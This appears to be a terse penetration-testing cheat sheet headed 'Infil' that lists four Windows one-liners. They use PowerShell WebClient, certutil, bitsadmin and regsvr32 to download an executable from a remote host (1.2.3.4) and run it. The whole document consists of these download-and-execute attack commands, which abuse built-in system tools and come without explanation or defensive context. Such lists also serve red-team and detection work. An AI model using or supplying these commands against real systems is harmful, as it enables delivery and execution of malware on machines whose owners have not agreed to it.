# Infil
## PowerShell
```powershell
powershell (new-object System.Net.WebClient).DownloadFile('http://1.2.3.4/5.exe','c:\download\a.exe');start-process 'c:\download\a.exe'
```

## Certutil
```sh
certutil -urlcache -split -f http://1.2.3.4/5.exe c:\download\a.exe&&c:\download\a.exe
```

## bitsadmin
```
bitsadmin /transfer n http://1.2.3.4/5.exe c:\download\a.exe && c:\download\a.exe
```

## regserv32
```
regsvr32 /u /s /i:http://1.2.3.4/5.exe scrobj.dll
```